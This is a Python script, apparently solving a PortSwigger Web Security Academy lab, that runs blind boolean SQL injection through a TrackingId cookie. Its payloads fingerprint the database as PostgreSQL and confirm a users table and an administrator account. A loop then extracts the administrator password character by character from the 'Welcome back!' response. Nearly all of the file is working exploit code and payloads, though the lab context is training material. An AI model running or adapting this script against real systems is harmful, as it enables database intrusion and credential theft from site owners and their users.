#!/usr/bin/env python3

import requests

url = 'https://0af800a103b72b0d834133d800af009e.web-security-academy.net/'

"""
TrackingId = ZKrQl8pOhmfnXfoi
Session = 18n8HR7T9z43SqflhSKa2LaARFWfAcpT
payload = f'''{trackingid}' AND SUBSTR(version(),1,10) = 'PostgreSQL'''
"""
trackingid = 'ZKrQl8pOhmfnXfoi'
payload = f'''{trackingid}' AND SUBSTR(version(),1,10) = 'PostgreSQL'''

cookie = {
    'session': '18n8HR7T9z43SqflhSKa2LaARFWfAcpT',
    'TrackingId': payload
}

r = requests.get(url, cookies=cookie)

if 'Welcome back!' in r.text:
    print('PostgreSQL is True')
else:
    print('PostgreSQL is False')

"""
TrackingId = G8H2nJYh2VLEzT4X
Session = 99OQmztUcTiLkRhlz6btyTRnxFoUZ9i5
following line confirm there is a table called users 
payload = f'''{trackingid}' AND (SELECT table_name FROM information_schema.tables WHERE table_name='users') = 'users'''

"""

payload = f'''{trackingid}' AND (SELECT table_name FROM information_schema.tables WHERE table_name='users') = 'users'''

cookie = {
    'session': '18n8HR7T9z43SqflhSKa2LaARFWfAcpT',
    'TrackingId': payload
}

r = requests.get(url, cookies=cookie)

if 'Welcome back!' in r.text:
    print('Table name is users is True')
else:
    print('Table name is users is False')
"""
Then, we can try to confirm the administrator username:

payload = f'''{trackingid}' AND (SELECT 'a' FROM users WHERE username='administrator')='a'''
"""
payload = f'''{trackingid}' AND (SELECT 'a' FROM users WHERE username='administrator')='a'''

cookie = {
    'session': '18n8HR7T9z43SqflhSKa2LaARFWfAcpT',
    'TrackingId': payload
}

r = requests.get(url, cookies=cookie)

if 'Welcome back!' in r.text:
    print('user name=administrator in users is True')
else:
    print('user name=administrator in users is False')

""" Password"""

# !/usr/bin/env python3

import requests
from string import ascii_lowercase, digits

chars = ascii_lowercase + digits
position = 1
password = ''

while True:
    for character in chars:
        payload = f'''{trackingid}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{character}'''
        cookie = {
            'session': 'vPWvc2zNez4KXQTSQWyqy6EOJLtjbdCb',
            'TrackingId': payload
        }

        r = requests.get(url, cookies=cookie)

        if 'Welcome back!' in r.text:
            # print('True')
            password += ''.join(character)
            print(f'[+] Found password: {password}', end='\r')
            position += 1
            break
        else:
            # print('False')
            pass

    if len(password) >= 20:
        print(f'[+] administrator password: {password}')
        exit()